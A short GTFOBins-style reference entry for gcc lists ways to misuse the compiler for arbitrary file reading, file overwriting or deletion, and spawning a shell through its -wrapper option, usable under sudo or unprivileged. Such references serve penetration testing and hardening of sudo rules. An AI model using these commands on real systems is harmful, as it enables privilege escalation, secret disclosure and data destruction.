---
type: gtfobin
name: gcc
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# gcc

## file-read

```bash
gcc -x c -E /path/to/input-file
```
**Contexts:** sudo, unprivileged

```bash
gcc @/path/to/input-file
```
_The file is read and parsed as a list of files (one per line), the content is displayed as error messages._
**Contexts:** sudo, unprivileged

## file-write

```bash
gcc -x c /dev/null -o /path/to/input-file
```
_This actually deletes the file._
**Contexts:** sudo, unprivileged

## shell

```bash
gcc -wrapper /bin/sh,-s x
```
_In some older versions, the `x` argument must instead reference any existing file._
**Contexts:** sudo, unprivileged
